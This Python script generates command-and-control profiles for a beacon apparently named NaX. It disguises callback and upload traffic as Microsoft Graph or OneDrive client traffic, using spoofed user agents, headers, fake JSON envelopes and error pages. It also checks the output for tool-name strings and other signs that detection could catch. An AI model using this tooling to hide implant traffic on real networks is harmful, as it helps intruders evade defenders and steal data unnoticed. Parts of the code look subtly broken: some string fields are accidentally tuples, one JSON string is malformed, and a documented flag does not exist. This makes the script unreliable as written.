#!/usr/bin/env python3
"""
OPSEC profile generator for NaX (HTTP listener + beacon).

Emits paste-ready NaX v2 profile JSON ("callbacks" schema consumed by the
listener UI 'profile_json' field and by the agent-side profile parser, see
NaX/src_server/agent_nonameax/pl_profile.go / pl_wire.go) — with realistic
per-persona request/response shapes instead of generic 404 pages.

Personas:
  graph     - Microsoft Graph API client traffic (Office/Edge on Win10/11)
  onedrive  - OneDrive sync client traffic (MicrosoftOneDriveSync UA)

Everything is generated against the beacon's hard parser caps (beacon
src/Core/PackerProfile.c + server pl_wire.go):
  format:    raw | base64 | base64url | hex
  placement: body | header | cookie | parameter
  caps:      hosts<=4 (<=127 chars), URIs<=8/dir (<=127 chars), headers<=8/dir
             (<=255), params<=8 (<=127), UA<=255, meta name<=127,
             prepend/append/empty_resp<=511 bytes

Usage:
  python3 gen_profile.py --persona graph --host 203.0.113.7:443 --ssl \
                         --out graph.json
  python3 gen_profile.py --persona onedrive --host cdn.example.com --ssl \
                         --rotate 6 --out od.json

Import the result into the listener profile_json field, then REBUILD the
payload (the beacon bakes the profile blob from the same JSON at build time
via pl_build_payload.go -> parseProfileFromListenerConfig).
"""

import argparse
import json
import random
import string
import sys
import time
import uuid

MAX_URI_CHARS = 127
MAX_HDR_CHARS = 255
MAX_PARAM_CHARS = 127
MAX_HOST_CHARS = 127
MAX_UA_CHARS = 255
MAX_META_NAME = 127
MAX_ENVELOPE = 480          # beacon cap is 511 — keep headroom for rotation bytes
MAX_URIS = 8
MAX_PARAMS = 8
MAX_HDRS = 8
MAX_HOSTS = 4

BRAND_NEEDLES = ("/nax", "nonameax", "nomad", "x-nax", "nx-", "beacon",
                 "submit.php", "/api/v1/status", "putty", "cobalt")

# plausible Chrome stable majors for the graph persona (never the tool default)
GRAPH_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0",
]
GRAPH_CHROMES = (136, 137, 138, 139)

ONE_DRIVE_UA = ("Microsoft OneDrive 25.{d1[0]}.{d1[1]}.{d1[2]} "
                "(Windows 10 Pro x64) 32-bit")


def _rid() -> str:
    """Uppercase request-id, Graph style (32 hex)."""
    return "".join(random.choice("0123456789ABCDEF") for _ in range(32))


def _date() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()) + "Z"


# ---------------------------------------------------------------- personas

PERSONAS = {}


def _graph_envelope(ctx: str) -> str:
    return json.dumps({"@odata.context":
                       "https://graph.microsoft.com/v1.0/$metadata#" + ctx,
                       "value": None}, separators=(",", ":"))


def persona_graph() -> dict:
    ua = random.choice(GRAPH_UAS).format(v=random.choice(GRAPH_CHROMES))
    ctx_uuid = str(uuid.uuid4())

    get_uris = [
        "/v1.0/me/presence",
        "/v1.0/me/mailFolders('Inbox')/messages/$count",
        "/beta/me/outlook/masterCategories",
        "/v1.0/me/insights/trending",
        "/v1.0/me/calendarView/delta",
    ]
    get_params = {
        "$select": "isRead,receivedDateTime",
        "$top": "20",
        "$scope": "Mail.Read Files.Read",
    }
    get_client_hdrs = {
        "Accept": "application/json; odata.metadata=minimal",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "client-request-id": ctx_uuid,
        "Return-Client-Request-Id": "false",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "none",
    }
    get_meta = {"format": "base64url", "mask": True,
                "placement": "parameter", "name": "$filter",
                "prepend": "", "append": ""}
    get_server_hdrs = {
        "Content-Type": "application/json; odata.metadata=minimal; "
                        "odata.streaming=true; IEEE754Compatible=false; "
                        "charset=utf-8",
        "Vary": "Accept-Encoding",
        "Cache-Control": "private",
        "X-Content-Type-Options": "nosniff",
        "request-id": _rid(),
    }
    get_out = {"format": "base64", "mask": True, "placement": "body",
               "name": "",
               "prepend": _graph_envelope("users('user%40contoso.com')/presence")[1:-1] + ',"_p":"',
               "append": '","@odata.etag":"W/\\"datetime\'2026-01-01T00%3A00%3A00Z\\""}',
               "empty_resp": ('{"@odata.context":"https://graph.microsoft.com/v1.0/'
                              '$metadata#users(\'user%40contoso.com\')/presence","id":'
                              '"fa8bf3dc-eebc-46e5-8a75-5a2c25c7e284","availability":'
                              '"Available","activity":"Available"}')}

    post_uris = [
        "/v1.0/me/drive/items/root:/Documents/sync.tmp:/content",
        "/v1.0/me/sendMail",
        "/beta/me/todo/lists/work/tasks",
        "/v1.0/me/events",
    ]
    post_client_hdrs = {
        "Content-Type": "application/json; charset=utf-8",
        "Accept": "application/json; odata.metadata=minimal",
        "client-request-id": ctx_uuid,
        "X-AnchorMailbox": "user@contoso.com",
        "Prefer": "outlook.body-content-type=\"text\"",
    }
    post_meta = {"format": "base64url", "mask": True,
                 "placement": "header", "name": "X-MS-Correlation-Id",
                 "prepend": "", "append": ""}
    post_out = {"format": "base64url", "mask": True, "placement": "body",
                "name": "",
                "prepend": ('{"@odata.type":"#microsoft.graph.uploadSession",'
                            '"uploadUrl":"https://graph.microsoft.com/v1.0/'
                            'me/drive/root:/sync.tmp:/content?uploadSessionId=',),
                "append": ('","nextExpectedRanges":["0-"],'
                           '"expirationDateTime":"' + _date().replace("T", "T") + '"}'),
                "empty_resp": ('{"@odata.type":"#microsoft.graph.driveItem",'
                               '"id":"01BYE5RZ","name":"sync.tmp","size":0,'
                               '"lastModifiedDateTime":"' + _date() + '}')}
    post_server_out = {"format": "base64", "mask": True, "placement": "body",
                       "name": "",
                       "prepend": ('{"@odata.type":"#microsoft.graph.driveItem",'
                                   '"id":"01BYE5RZ","name":"sync.tmp","_r":"'),
                       "append": '","file":{"mimeType":"application/octet-stream"}}',
                       "empty_resp": ('{"@odata.type":"#microsoft.graph.driveItem",'
                                      '"id":"01BYE5RZ","name":"sync.tmp","size":0}')}

    err = {
        "status": 403,
        "body": json.dumps({
            "error": {
                "code": "Authorization_RequestDenied",
                "message": "Insufficient privileges to complete the operation.",
                "innerError": {
                    "date": _date(),
                    "request-id": _rid(),
                    "client-request-id": ctx_uuid,
                },
            }
        }, separators=(",", ":")),
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "request-id": _rid(),
            "X-MS-AGS-DiagnosticInfo": '{"ServerInfo":{"DataCenter":"West Europe",'
                                       '"Slice":"3","Ring":"2","ScaleUnit":"001",'
                                       '"RoleInstance":"AM2-PE"}}',
            "Cache-Control": "private",
        },
    }
    return {
        "hosts": None, "user_agent": ua, "beacon_id_header": "X-MS-Correlation-Id",
        "rotation": "random", "server_error": err,
        "get": {"uri": get_uris, "client": {"headers": get_client_hdrs, "metadata": get_meta,
                                            "parameters": get_params},
                "server": {"headers": get_server_hdrs, "output": get_out}},
        "post": {"uri": post_uris, "client": {"headers": post_client_hdrs, "metadata": post_meta,
                                              "output": post_out},
                 "server": {"headers": get_server_hdrs, "output": post_server_out}},
    }


def persona_onedrive() -> dict:
    d1 = [random.randint(1, 99), random.randint(1, 999), random.randint(1, 9999)]
    ua = ONE_DRIVE_UA.format(d1=d1)
    ctx_uuid = str(uuid.uuid4())

    get_uris = [
        "/v1.0/me/drive/root/delta",
        "/v1.0/me/drive/root/special/documents",
        "/v1.0/me/drive/sync/batch",
        "/v1.0/me/drive/recent",
        "/v1.0/me/drive/items/01BYE5RZ",
    ]
    get_params = {"select": "id,name,size,parent", "top": "40",
                  "expand": "children,thumbnails"}
    get_client_hdrs = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "X-Client-Service-Principal-Identifier": "OneDriveFileSyncClient_Prod",
        "X-RequestAccessKey": "1",
        "application": "MicrosoftOneDriveSync",
        "Accept-Language": "en-US,en;q=0.9",
    }
    get_meta = {"format": "base64", "mask": True,
                "placement": "cookie", "name": "SCACHE",
                "prepend": "", "append": ""}
    get_server_hdrs = {
        "Content-Type": "application/json",
        "Vary": "Accept-Encoding",
        "Cache-Control": "private",
        "client-request-id": ctx_uuid,
        "X-Content-Type-Options": "nosniff",
    }
    get_out = {"format": "base64", "mask": True, "placement": "body",
               "name": "",
               "prepend": ('{"@odata.context":"https://graph.microsoft.com/v1.0/'
                           '$metadata#drive/root","value":"'),
               "append": '","folder":{"childCount":42},"@odata.etag":"W/\\"od-01\\""}',
               "empty_resp": ('{"@odata.nextLink":"about:blank",'
                              '"@odata.deltaLink":"https://graph.microsoft.com/v1.0/'
                              'me/drive/root/delta?$deltatoken=od0001"}')}

    post_uris = [
        "/v1.0/me/drive/root:/Documents/sync.dat:/content",
        "/v1.0/me/drive/items/01BYE5RZ/uploadSession",
        "/v1.0/me/drive/sync/state",
    ]
    post_client_hdrs = {
        "Content-Type": "application/octet-stream",
        "Accept": "application/json",
        "application": "MicrosoftOneDriveSync",
    }
    post_meta = {"format": "base64", "mask": True,
                 "placement": "header", "name": "X-Ms-Client-Request-Id",
                 "prepend": "", "append": ""}
    post_out = {"format": "base64", "mask": True, "placement": "body",
                "name": "",
                "prepend": ('{"uploadUrl":"https://odsync.graph.microsoft.com/v1.0/'
                            'upload?sid="',),
                "append": ',"expiryTime":"' + _date() + '","nextExpectedRanges":["0-"]}',
                "empty_resp": ('{"id":"01BYE5RZ","size":0,"name":"sync.dat"}')}
    post_server_out = {"format": "base64", "mask": True, "placement": "body",
                       "name": "",
                       "prepend": '{"id":"01BYE5RZ","_t":"',
                       "append": '","size":42,"parentReference":{"driveId":"b!od01"}}',
                       "empty_resp": '{"id":"01BYE5RZ","size":0}'}

    err = {
        "status": 429,
        "body": json.dumps({
            "error": {
                "code": "activityLimitReached",
                "message": "The request has been throttled.",
                "innerError": {"code": "throttledRequest",
                               "retry-after": "15",
                               "date": _date(),
                               "request-id": _rid()},
            }
        }, separators=(",", ":")),
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "Retry-After": "15",
            "Rate-Limit-Remaining": "0",
            "client-request-id": ctx_uuid,
        },
    }
    return {
        "hosts": None, "user_agent": ua, "beacon_id_header": "X-Ms-Client-Request-Id",
        "rotation": "random", "server_error": err,
        "get": {"uri": get_uris, "client": {"headers": get_client_hdrs, "metadata": get_meta,
                                            "parameters": get_params},
                "server": {"headers": get_server_hdrs, "output": get_out}},
        "post": {"uri": post_uris, "client": {"headers": post_client_hdrs, "metadata": post_meta,
                                              "output": post_out},
                 "server": {"headers": get_server_hdrs, "output": post_server_out}},
    }


PERSONAS["graph"] = persona_graph
PERSONAS["onedrive"] = persona_onedrive


# ---------------------------------------------------------------- validator

def validate(profile_json: str, persona: str) -> list[str]:
    """Return list of hard failures (empty = pass). Warnings are printed."""
    errs, warns = [], []
    doc = json.loads(profile_json)
    cbs = doc.get("callbacks", [])
    if len(cbs) != 1:
        errs.append(f"expected exactly one callback block, got {len(cbs)}")
        return errs
    cb = cbs[0]

    hosts = cb.get("hosts") or []
    if not hosts:
        errs.append("no hosts defined")
    if len(hosts) > MAX_HOSTS:
        errs.append(f"hosts {len(hosts)} > beacon cap {MAX_HOSTS}")
    for h in hosts:
        if len(h) > MAX_HOST_CHARS:
            errs.append(f"host too long ({len(h)}): {h}")
        if "/" in h:
            errs.append(f"host must not contain a path: {h}")

    ua = cb.get("user_agent", "")
    if not ua:
        errs.append("empty user_agent")
    if len(ua) > MAX_UA_CHARS:
        errs.append(f"user_agent too long ({len(ua)})")
    bhdr = cb.get("beacon_id_header", "")
    if not bhdr or bhdr.lower() == "x-beacon-id":
        errs.append("beacon_id_header must be persona-native (e.g. X-MS-Correlation-Id)")
    if cb.get("rotation") != "random":
        warns.append('rotation should be "random" (metronomic URIs are an IOC)')

    # walk only *values* — the schema key "beacon_id_header" must not self-trip
    values = []
    def _collect(node):
        if isinstance(node, dict):
            for v in node.values():
                _collect(v)
        elif isinstance(node, list):
            for v in node:
                _collect(v)
        elif isinstance(node, str):
            values.append(node)
    _collect(doc)
    low = "\n".join(values).lower()
    for needle in BRAND_NEEDLES:
        if needle in low:
            errs.append(f"brand/tool string on the wire: '{needle}'")

    for direction in ("get", "post"):
        tx = cb.get(direction) or {}
        uris = tx.get("uri") or []
        if not uris:
            errs.append(f"{direction}: no URIs")
            continue
        if len(uris) > MAX_URIS:
            errs.append(f"{direction}: {len(uris)} URIs > cap {MAX_URIS}")
        if len(uris) < 3:
            warns.append(f"{direction}: <3 URIs — low rotation diversity")
        for u in uris:
            if not u.startswith("/"):
                errs.append(f"{direction} URI must start with '/': {u}")
            if "?" in u or len(u) > MAX_URI_CHARS:
                errs.append(f"{direction} URI too long or has baked query: {u[:40]}…")

        client = tx.get("client", {})
        n_hdr = len(client.get("headers", {}))
        if n_hdr > MAX_HDRS:
            errs.append(f"{direction}: {n_hdr} client headers > cap {MAX_HDRS}")
        n_par = len(client.get("parameters", {}))
        if n_par > MAX_PARAMS:
            errs.append(f"{direction}: {n_par} params > cap {MAX_PARAMS}")

        meta = client.get("metadata", {})
        if meta.get("format") not in ("raw", "base64", "base64url", "hex"):
            errs.append(f"{direction} metadata format invalid: {meta.get('format')}")
        if meta.get("placement") not in ("body", "header", "cookie", "parameter"):
            errs.append(f"{direction} metadata placement invalid: {meta.get('placement')}")
        name = meta.get("name", "")
        if not name or len(name) > MAX_META_NAME:
            errs.append(f"{direction} metadata name missing/too long")
        if not meta.get("mask"):
            warns.append(f"{direction} metadata mask=False — wire bytes pass "
                         "through as plaintext base64; consider mask=True")

        out = ((client.get("output") or {}) if direction == "post"
               else (tx.get("server", {}).get("output") or {}))
        for field, label in (("prepend", "prepend"), ("append", "append"),
                             ("empty_resp", "empty_resp")):
            val = out.get(field) or ""
            if isinstance(val, str) and len(val.encode()) > MAX_ENVELOPE:
                errs.append(f"{direction} {label} {len(val.encode())}B > safe cap {MAX_ENVELOPE}B "
                            "(beacon truncates at 511 — breakage risk)")
        if direction == "post" and not out.get("empty_resp"):
            warns.append(f"{direction} POST client output has no empty_resp")

        s_out = tx.get("server", {}).get("output", {})
        if not s_out.get("empty_resp"):
            warns.append(f"{direction} server empty_response missing — a no-task cycle "
                         "would emit a suspicious zero-length body")

    se = cb.get("server_error", {})
    if not se.get("status") or not se.get("body"):
        errs.append("server_error block missing (generic 404 = the thing this "
                    "generator exists to avoid)")
    else:
        ct = (se.get("headers") or {}).get("Content-Type", "")
        if "json" in (se["body"][:1] == "{" and "json" or "x") and "json" not in ct.lower():
            warns.append("server_error body is JSON but Content-Type isn't")
    return errs, warns


# ---------------------------------------------------------------- main

def main() -> int:
    ap = argparse.ArgumentParser(description="NaX OPSEC profile generator")
    ap.add_argument("--persona", choices=sorted(PERSONAS), default="graph")
    ap.add_argument("--host", action="append", default=[],
                    help="callback host[:port] — repeatable, max 4")
    ap.add_argument("--ssl", action="store_true",
                    help="mark https (hosts without an explicit port get :443 semantics server-side)")
    ap.add_argument("--out", required=True, help="output JSON path")
    ap.add_argument("--note", default="", help="operator note embedded as _comment")
    args = ap.parse_args()

    if not args.host:
        print("[!] --host required (repeatable)", file=sys.stderr)
        return 2
    if len(args.host) > MAX_HOSTS:
        print(f"[!] max {MAX_HOSTS} hosts", file=sys.stderr)
        return 2

    cb = PERSONAS[args.persona]()
    cb["hosts"] = args.host

    profile_json = json.dumps(
        {"callbacks": [cb]}, indent=2, ensure_ascii=False)

    errs, warns = validate(profile_json, args.persona)
    for w in warns:
        print(f"[w] {w}")
    if errs:
        for e in errs:
            print(f"[!] {e}", file=sys.stderr)
        return 1

    if args.note:
        doc = json.loads(profile_json)
        doc["_comment"] = args.note
        profile_json = json.dumps(doc, indent=2, ensure_ascii=False)

    with open(args.out, "w", encoding="utf-8") as fh:
        fh.write(profile_json + "\n")

    cb0 = json.loads(profile_json)["callbacks"][0]
    print(f"[+] wrote {args.out}")
    print(f"    persona={args.persona} ua='{cb0['user_agent'][:60]}…'")
    print(f"    uri counts: GET={len(cb0['get']['uri'])} POST={len(cb0['post']['uri'])} "
          f"host={', '.join(cb0['hosts'])}")
    print("[i] import into the listener profile_json field, then rebuild the "
          "payload (beacon bakes the profile at build time)")
    return 0


if __name__ == "__main__":
    sys.exit(main())